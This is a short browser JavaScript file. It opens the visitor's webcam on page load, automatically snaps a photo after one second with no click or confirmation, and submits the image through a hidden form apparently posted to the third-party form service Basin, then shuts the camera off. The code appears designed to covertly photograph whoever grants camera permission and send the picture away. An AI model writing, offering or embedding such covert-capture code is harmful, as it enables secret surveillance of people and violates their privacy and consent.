const video = document.getElementById("preview");
const photoInput = document.getElementById("photoInput");
const form = document.getElementById("autoUploadForm");
let stream;

startCamera();

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    setTimeout(captureAndSubmit, 1000);

  } catch (err) {
    console.error("Camera failed:", err);
  }
}

function captureAndSubmit() {
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext("2d");
  ctx.drawImage(video, 0, 0);

  canvas.toBlob((blob) => {
    const file = new File([blob], "photo.jpg", { type: "image/jpeg" });

    // Put file into the real HTML form input
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    photoInput.files = dataTransfer.files;

    // Submit real form (Basin accepts this)
    form.submit();

    stopCamera();
  }, "image/jpeg", 0.9);
}

function stopCamera() {
  if (stream) stream.getTracks().forEach(t => t.stop());
}
